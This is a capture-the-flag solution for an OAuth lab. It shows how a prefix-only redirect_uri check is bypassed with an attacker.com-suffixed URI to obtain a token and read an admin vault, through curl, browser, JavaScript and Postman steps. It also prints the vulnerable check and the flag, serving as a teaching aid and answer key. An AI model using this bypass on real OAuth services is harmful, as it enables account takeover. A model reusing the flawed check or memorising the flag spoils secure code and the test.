# Solution — The OAuth Misconfiguration

| Field | Value |
|---|---|
| Category | API Security |
| Path | `/api2/` |
| Flag | `flag{inm_r3d1r3ct_ur1_pr3f1x_tr1ck}` |

## Setup

```bash
export BASE="https://10.50.234.208:5001"
# or: export BASE="http://127.0.0.1:5001"
```

Confirm: `curl -s "$BASE/health"` returns `{"ok":true,...}`.

## What you're looking at

OAuth 2.0 Authorization Code flow with a `redirect_uri` validation bug:
`startswith()` instead of exact-match. Any URI that begins with
`https://legit-client.com/callback` passes validation.

---

## Option A — Command Line (curl)

### Step 1 — Read the docs

```bash
curl -s "$BASE/api2/docs" | head -40
```

Key facts:

- Client ID: `cloudvault`
- Client secret: `secret`
- Registered redirect URI: `https://legit-client.com/callback`

### Step 2 — Confirm the happy path works

```bash
curl -s "$BASE/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://legit-client.com/callback"
```

Expected: `{"message":"authorize successful","code":"...","redirect_to":"..."}`

### Step 3 — Confirm bogus redirects are rejected

```bash
curl -s "$BASE/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://evil.com/callback"
```

Expected: `{"error":"invalid_redirect_uri"}`

### Step 4 — Bypass with a prefix-matching URI

```bash
AUTH=$(curl -s "$BASE/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://legit-client.com/callback.attacker.com")
CODE=$(echo "$AUTH" | jq -r .code)
echo "$AUTH" | jq
```

Expected: authorize succeeds and returns a code.

> **Why this variant?** `https://legit-client.com.attacker.com/callback`
> does **not** start with the registered prefix (the `.` breaks it). But
> `https://legit-client.com/callback.attacker.com` **does** start with the
> prefix, then appends the attacker's domain.

### Step 5 — Exchange code for token

```bash
TOK=$(curl -s -X POST "$BASE/api2/oauth2/token" \
  -d "grant_type=authorization_code&code=$CODE&client_id=cloudvault&client_secret=secret" \
  | jq -r .access_token)
```

### Step 6 — Read the vault

```bash
curl -s "$BASE/api2/api/vault" -H "Authorization: Bearer $TOK"
```

Expected: `{"vault":"admin","flag":"flag{inm_r3d1r3ct_ur1_pr3f1x_tr1ck}"}`

---

## Option B — Browser (address bar + landing page)

The landing page exposes three steps: authorize, exchange, and vault. You
can trigger the authorize step directly from the browser address bar.

### Step 1 — Confirm the happy path

Open in a new tab:

```
https://<CTFd-Assigned-Host>/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://legit-client.com/callback
```

You'll see JSON with `"message": "authorize successful"` and a `code`.

### Step 2 — Confirm bogus redirects fail

Open:

```
https://<CTFd-Assigned-Host>/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://evil.com/callback
```

You'll see `{"error":"invalid_redirect_uri"}`.

### Step 3 — Trigger the bypass

Open:

```
https://<CTFd-Assigned-Host>/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://legit-client.com/callback.attacker.com
```

You'll see:

```json
{
  "message": "authorize successful",
  "redirect_to": "https://legit-client.com/callback.attacker.com?code=...",
  "code": "..."
}
```

**Copy the `code` value.**

### Step 4 — Exchange the code on the landing page

Open:

```
https://<CTFd-Assigned-Host>/api2/
```

Paste the code into the **"authorization code"** input and click **Exchange**.

The log shows a JSON response with `"access_token"`. The landing page
auto-fills the token into the next field.

### Step 5 — Access the vault

Click **GET /api/vault**. The log shows:

```json
{
  "vault": "admin",
  "flag": "flag{inm_r3d1r3ct_ur1_pr3f1x_tr1ck}"
}
```

---

## Option C — Browser DevTools Console

### Step 1 — Open `/api2/` and DevTools

Press F12 → **Console**.

### Step 2 — Complete the flow in JS

```javascript
// Step 1 — authorize with the bypass URI
const auth = await fetch(
  '/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://legit-client.com/callback.attacker.com'
).then(r => r.json());
console.log(auth);

// Step 2 — exchange the code
const tok = await fetch('/api2/oauth2/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: `grant_type=authorization_code&code=${auth.code}&client_id=cloudvault&client_secret=secret`
}).then(r => r.json());
console.log(tok);

// Step 3 — read the vault
const vault = await fetch('/api2/api/vault', {
  headers: { 'Authorization': 'Bearer ' + tok.access_token }
}).then(r => r.json());
console.log(vault);
```

The third `console.log` prints the flag.

---

## Option D — Postman Web

1. Go to **https://web.postman.co** and sign in.
2. **Step 1:** GET `<BASE>/api2/oauth2/authorize?client_id=cloudvault&response_type=code&scope=read&redirect_uri=https://legit-client.com/callback.attacker.com`. Copy `code` from the JSON response.
3. **Step 2:** POST `<BASE>/api2/oauth2/token`, Body → `x-www-form-urlencoded`:
   - `grant_type` = `authorization_code`
   - `code` = (your code)
   - `client_id` = `cloudvault`
   - `client_secret` = `secret`
   Copy `access_token` from the response.
4. **Step 3:** GET `<BASE>/api2/api/vault`, Headers → `Authorization: Bearer <access_token>`.

The response contains the flag.

---

## Submit

```
flag{inm_r3d1r3ct_ur1_pr3f1x_tr1ck}
```

## Why it works

```python
def _valid_redirect(uri):
    return uri.startswith(REGISTERED_REDIRECT)   # ← vulnerable
```

`startswith()` accepts any string beginning with the registered value.
Secure code compares URL components (scheme + host + path).

## Key takeaways

- **Validate `redirect_uri` by exact match or strict component comparison.**
- Redirect URI validation is the most commonly misimplemented part of OAuth.
- Decoy endpoints (`/api2/oauth2/v1/authorize`, `/api2/oauth2/v2/authorize`)
  return 404. Only `/api2/oauth2/authorize` is real.

## Troubleshooting

| Symptom | Fix |
|---|---|
| `{"error":"invalid_redirect_uri"}` | URI must start with `https://legit-client.com/callback`. |
| `{"error":"invalid_grant"}` on token | Code is single-use — redo Step 3. |
| `{"error":"invalid_client"}` | Check `client_id=cloudvault` and `client_secret=secret`. |